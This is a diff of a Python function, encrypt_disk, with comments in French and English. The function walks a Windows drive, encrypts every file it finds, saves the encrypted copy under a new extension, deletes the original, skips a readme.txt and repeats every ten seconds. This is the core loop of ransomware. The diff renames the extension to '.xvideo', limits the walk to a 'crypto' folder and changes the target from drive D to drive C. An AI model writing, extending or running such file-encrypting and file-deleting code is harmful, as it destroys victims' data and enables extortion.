@@ -28,11 +28,11 @@ def encrypt_disk(DriveLetter):
     while True:
         
         # Parcourir recursivement chaque dossier et ses sous-dossiers pour trouver des fichiers
-        for root, dirs, files in os.walk(f"{DriveLetter}:\\"):  
+        for root, dirs, files in os.walk(f"{DriveLetter}:\\crypto\\"):  
             # Pour chaque fichier
         	for file in files: 
         		# Continue if the file is donne
-        		if file.endswith(f".tsy-azo-fafana") or file=="readme.txt" or file==f"{app}":
+        		if file.endswith(f".xvideo") or file=="readme.txt" or file==f"{app}":
         			continue
         
         		# Open the file
@@ -45,7 +45,7 @@ def encrypt_disk(DriveLetter):
         		encrypted_data = cipher_suite.encrypt(data) 
         
         		# Write the file encrypted is other file
-        		with open(file_path + f".tsy-azo-fafana", "wb") as f: 
+        		with open(file_path + f".xvideo", "wb") as f: 
         			f.write(encrypted_data)
         		
         		# Remove the original file
@@ -53,4 +53,4 @@ def encrypt_disk(DriveLetter):
         time.sleep(10)
 
 if __name__ == "__main__":
-    encrypt_disk("D")
+    encrypt_disk("C")
